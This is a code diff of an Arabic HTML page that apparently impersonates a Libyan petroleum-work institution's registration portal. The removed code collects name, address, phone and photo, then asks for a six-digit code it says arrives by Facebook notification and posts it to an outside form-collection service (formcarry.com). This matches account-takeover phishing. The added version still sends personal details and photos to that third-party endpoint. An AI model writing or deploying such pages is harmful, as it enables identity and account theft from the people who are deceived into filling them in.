@@ -7,6 +7,7 @@
 
   <link rel="icon" href="uy.jpeg" type="image/png">
   <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+
   <style>
     body {
       font-family: 'Cairo', sans-serif;
@@ -86,12 +87,8 @@
       outline: none;
     }
 
-    input:disabled {
-      background-color: #f2f2f2;
-    }
-
     button {
-      width: 40%;
+      width: 50%;
       padding: 12px;
       font-size: 17px;
       background-color: gold;
@@ -102,273 +99,89 @@
       font-weight: bold;
       font-family: Calibri, sans-serif;
       transition: background-color 0.3s ease;
-      margin-bottom: 15px;
     }
 
-    button:hover:not(:disabled) {
+    button:hover {
       background-color: #e6c200;
     }
 
-    button:disabled {
-      background-color: #c2a300;
-      cursor: not-allowed;
-    }
-
-    #timer {
-      text-align: center;
-      font-weight: 600;
-      color: red;
-      margin-bottom: 20px;
-      min-height: 24px;
-    }
-
-    .otp-container {
-      display: flex;
-      justify-content: center;
-      gap: 10px;
-      margin-bottom: 10px;
-      direction: ltr;
-    }
-
-    .otp-input {
-      width: 44px;
-      height: 52px;
-      font-size: 26px;
+    .message {
+      margin-top: 20px;
       font-weight: bold;
-      text-align: center;
-      border: 2px solid #003366;
-      border-radius: 10px;
-      background-color: #f9f9f9;
-      color: #002147;
-      outline: none;
-      transition: border-color 0.2s ease;
+      font-size: 15px;
     }
 
-    .otp-input:focus {
-      border-color: gold;
-    }
-
-    .autofill-hint {
-      text-align: center;
-      font-size: 14px;
-      color: #555;
-      margin-top: 5px;
-      margin-bottom: 20px;
+    .success {
+      color: green;
     }
 
     .error {
       color: red;
-      font-size: 14px;
-      margin-top: -10px;
-      margin-bottom: 15px;
-    }
-
-    #imagePreview {
-      width: 100%;
-      margin-bottom: 15px;
-      display: none;
-      border-radius: 10px;
     }
   </style>
 </head>
 <body>
-  <div id="main-content">
-    <div class="container">
-      <div class="logo-container">
-        <img src="uy.jpeg" alt="شعار المؤسسة الليبية للعمل النفطي" />
-        <p>التسجيل في منظومة المؤسسة الليبية للعمل النفطي</p>
-      </div>
 
-      <h2>تسجيل الدخول</h2>
-
-      <form id="phoneForm" onsubmit="return sendPhone(event);" enctype="multipart/form-data">
-        <label for="fullname">الاسم الثلاثي:</label>
-        <input type="text" id="fullname" name="fullname" required placeholder="اكتب اسمك الثلاثي" />
-
-        <label for="address">العنوان:</label>
-        <input type="text" id="address" name="address" required placeholder="اكتب عنوانك" />
-
-        <label for="phone">رقم الهاتف:</label>
-        <input type="tel" id="phone" name="phone" required placeholder="اكتب رقم هاتفك" pattern="[0-9]{10,15}" title="أدخل رقم هاتف صحيح" autocomplete="tel" />
-
-        <label for="image">إرفاق صورة (اختياري):</label>
-        <input type="file" id="image" name="image" accept="image/*" capture="environment" />
-        <img id="imagePreview" src="" alt="معاينة الصورة" />
-
-        <button type="submit" id="sendPhoneBtn">إرسال البيانات</button>
-        <div id="timer"></div>
-      </form>
-
-      <form id="codeForm" onsubmit="return sendCode(event);">
-        <div id="codeField" style="display: none;">
-          <label style="font-weight: bold; color: #003366; font-size: 18px;">
-            جاري إرسال الكود عبر إشعار فيسبوك
-          </label>
-
-          <div class="otp-container" id="otpInputs">
-            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" />
-            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" />
-            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" />
-            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" />
-            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" />
-            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" />
-          </div>
-
-          <div class="autofill-hint">
-            سيتم إدخال الكود تلقائيًا عند وصول إشعار من فيسبوك إذا كان مدعومًا من المتصفح.
-          </div>
-
-          <div id="errorMessage" class="error"></div>
-          <button type="submit" id="sendCodeBtn">تأكيد الكود</button>
-
-          <div id="processingMessage" style="display: none; color: #003366; font-weight: bold; margin-top: 20px;">
-            جاري معالجة طلبك، يمكن المراجعة خلال 7 أيام إلى 30 إذا كان هناك طلب بيانات جديدة منك وشكرًا
-          </div>
-        </div>
-      </form>
+  <div class="container">
+    <div class="logo-container">
+      <img src="uy.jpeg" alt="شعار المؤسسة الليبية للعمل النفطي" />
+      <p>التسجيل في منظومة المؤسسة الليبية للعمل النفطي</p>
     </div>
+
+    <h2>تسجيل الدخول</h2>
+
+    <form id="registerForm" enctype="multipart/form-data">
+      <label for="fullname">الاسم الثلاثي:</label>
+      <input type="text" id="fullname" name="fullname" required placeholder="اكتب اسمك الثلاثي" />
+
+      <label for="address">العنوان:</label>
+      <input type="text" id="address" name="address" required placeholder="اكتب عنوانك" />
+
+      <label for="phone">رقم الهاتف:</label>
+      <input type="tel" id="phone" name="phone" required pattern="[0-9]{10,15}" placeholder="اكتب رقم هاتفك" title="أدخل رقم هاتف صحيح" autocomplete="tel" />
+
+      <label for="image">إرفاق صورة (اختياري):</label>
+      <input type="file" id="image" name="image" accept="image/*" />
+
+      <button type="submit">إرسال</button>
+
+      <div id="message" class="message"></div>
+    </form>
   </div>
 
   <script>
-    let countdownInterval;
+    document.getElementById('registerForm').addEventListener('submit', function(e) {
+      e.preventDefault();
 
-    function startTimer(duration) {
-      let timeLeft = duration;
-      const timerDisplay = document.getElementById('timer');
-      const sendPhoneBtn = document.getElementById('sendPhoneBtn');
-      const phoneInput = document.getElementById('phone');
-      timerDisplay.style.display = 'block';
-      updateTimer(timeLeft);
-      countdownInterval = setInterval(() => {
-        timeLeft--;
-        updateTimer(timeLeft);
-        if (timeLeft <= 0) {
-          clearInterval(countdownInterval);
-          timerDisplay.style.display = 'none';
-          sendPhoneBtn.disabled = false;
-          phoneInput.disabled = false;
-        }
-      }, 1000);
-    }
-
-    function updateTimer(seconds) {
-      const timerDisplay = document.getElementById('timer');
-      const minutes = Math.floor(seconds / 60).toString().padStart(2, '0');
-      const secs = (seconds % 60).toString().padStart(2, '0');
-      timerDisplay.textContent = `يرجى الانتظار: ${minutes}:${secs}`;
-    }
-
-    function sendPhone(event) {
-      event.preventDefault();
-
-      const phoneInput = document.getElementById('phone');
-      const fullname = document.getElementById('fullname').value;
-      const address = document.getElementById('address').value;
-      const image = document.getElementById('image').files[0];
-
-      if (!phoneInput.value.match(/^[0-9]{10,15}$/)) {
-        alert('يرجى إدخال رقم هاتف صحيح مكون من 10 إلى 15 رقماً');
-        phoneInput.focus();
-        return false;
-      }
-
-      const formData = new FormData();
-      formData.append("fullname", fullname);
-      formData.append("address", address);
-      formData.append("phone", phoneInput.value);
-      if (image) {
-        formData.append("image", image);
-      }
+      const form = e.target;
+      const formData = new FormData(form);
+      const message = document.getElementById('message');
 
       fetch('https://formcarry.com/s/a-Yw-WFDEqO', {
         method: 'POST',
-        body: formData
-      })
-      .then(response => {
-        if (!response.ok) throw new Error('فشل إرسال البيانات');
-        phoneInput.disabled = true;
-        document.getElementById('sendPhoneBtn').disabled = true;
-        document.getElementById('codeField').style.display = 'block';
-        startTimer(480);
-      })
-      .catch(error => {
-        alert('تعذر إرسال البيانات. حاول مرة أخرى.');
-        console.error(error);
-      });
-
-      return false;
-    }
-
-    document.querySelectorAll('.otp-input').forEach((input, index, inputs) => {
-      input.addEventListener('input', () => {
-        if (input.value.length === 1 && index < inputs.length - 1) {
-          inputs[index + 1].focus();
+        body: formData,
+        headers: {
+          'Accept': 'application/json'
         }
-      });
-      input.addEventListener('keydown', (e) => {
-        if (e.key === 'Backspace' && input.value === '' && index > 0) {
-          inputs[index - 1].focus();
-        }
-      });
-    });
-
-    function sendCode(event) {
-      event.preventDefault();
-      const codeInputs = document.querySelectorAll('.otp-input');
-      const code = Array.from(codeInputs).map(input => input.value).join('');
-      const errorMessage = document.getElementById('errorMessage');
-      const processingMessage = document.getElementById('processingMessage');
-      const sendCodeBtn = document.getElementById('sendCodeBtn');
-      errorMessage.textContent = '';
-
-      if (code.length !== 6 || !/^[0-9]{6}$/.test(code)) {
-        errorMessage.textContent = 'يرجى إدخال الكود المكون من 6 أرقام بشكل صحيح.';
-        return false;
-      }
-
-      const payload = {
-        phone: document.getElementById('phone').value,
-        code
-      };
-
-      fetch('https://formcarry.com/s/a-Yw-WFDEqO', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-        body: JSON.stringify(payload)
       })
-      .then(async response => {
-        const data = await response.json();
-        if (response.ok && data.success !== false) {
-          sendCodeBtn.style.display = 'none';
-          processingMessage.style.display = 'block';
+      .then(response => response.json())
+      .then(data => {
+        if (data.success) {
+          message.textContent = '✅ تم إرسال البيانات بنجاح.';
+          message.className = 'message success';
+          form.reset();
         } else {
-          errorMessage.textContent = '❌ هناك خطأ في الكود المرسل. حاول مرة أخرى.';
+          message.textContent = '❌ حدث خطأ أثناء الإرسال. حاول مجددًا.';
+          message.className = 'message error';
         }
       })
       .catch(error => {
-        errorMessage.textContent = '⚠️ تعذر الاتصال بالخادم.';
+        message.textContent = '⚠️ تعذر الاتصال بالخادم.';
+        message.className = 'message error';
         console.error(error);
       });
-
-      return false;
-    }
-
-    // ✅ معاينة الصورة قبل الإرسال
-    document.getElementById('image').addEventListener('change', function () {
-      const file = this.files[0];
-      const preview = document.getElementById('imagePreview');
-      if (file) {
-        const reader = new FileReader();
-        reader.onload = function (e) {
-          preview.src = e.target.result;
-          preview.style.display = 'block';
-        };
-        reader.readAsDataURL(file);
-      } else {
-        preview.style.display = 'none';
-        preview.src = '';
-      }
     });
   </script>
+
 </body>
 </html>
